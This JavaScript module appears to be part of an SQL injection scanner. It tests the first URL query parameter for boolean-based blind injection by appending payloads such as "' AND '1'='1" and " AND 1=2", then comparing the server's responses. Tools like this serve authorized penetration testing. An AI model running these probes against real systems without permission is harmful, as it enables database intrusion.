import { cleanUpInfo } from "./helper.js";
import { sendRequest } from "./http.js";

// Boolean method
export async function injectable(setting) {
	let query = setting.urlQuery;
	const firstParamsName = [...query.keys()][0];
	const firstParamsValue = query.get(firstParamsName);
	const resOriginal = await sendRequest(setting, query);


	const resTrueString = await sendRequest(setting, mutateQuery(query, firstParamsName,  firstParamsValue + "' AND '1'='1"));
	const resFalseString = await sendRequest(setting, mutateQuery(query, firstParamsName, firstParamsValue + "' AND '1'='2"));
	if (isSameRes(resOriginal, resTrueString) && !isSameRes(resOriginal, resFalseString))
		return { injectable: true, context: "string" };

	const resTrueNumber = await sendRequest(setting, mutateQuery(query, firstParamsName, firstParamsValue + " AND 1=1"));
	const resFalseNumber = await sendRequest(setting, mutateQuery(query, firstParamsName, firstParamsValue + " AND 1=2"));
	if (isSameRes(resOriginal, resTrueNumber) && !isSameRes(resOriginal, resFalseNumber))
		return { injectable: true, context: "number" };

	cleanUpInfo(setting.db, 'URL not injectable');
}

function mutateQuery(query, name, value) {
	let mutatedQuery = new URLSearchParams(query);
	mutatedQuery.set(name, value);
	return mutatedQuery;
}

function isSameRes(original, mutated) {
	if (!original || !mutated) 
		return false;
	if (original.status !== mutated.status)
		return false;
	if (original.body === mutated.body)
		return true;
	return similarity(original.body, mutated.body);
}

function similarity(original, mutated) {
    if (original.length === 0 && mutated.length === 0)
		return true;
    const longer = Math.max(original.length, mutated.length);
    const shorter = Math.min(original.length, mutated.length);
    return (shorter / longer) >= 0.95;
}
